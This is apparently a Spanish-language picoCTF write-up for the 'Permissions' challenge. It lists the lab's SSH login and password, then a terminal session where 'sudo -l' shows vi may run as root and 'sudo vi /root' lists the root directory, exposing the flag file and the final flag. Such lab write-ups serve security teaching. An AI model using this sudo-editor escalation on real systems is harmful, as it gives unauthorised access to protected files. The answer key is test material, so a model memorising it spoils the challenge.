## Permissions
### Description 

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 57922 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?
### Hint

- What permissions do you have?

## Solución 
```
picoplayer@challenge:/$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi /root
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                                                                                                                                                                
./
.vim/
.bashrc
.flag.txt  <---- nuestra bandera
.profile
.viminfo
.flag.txt.swp
~  


picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```
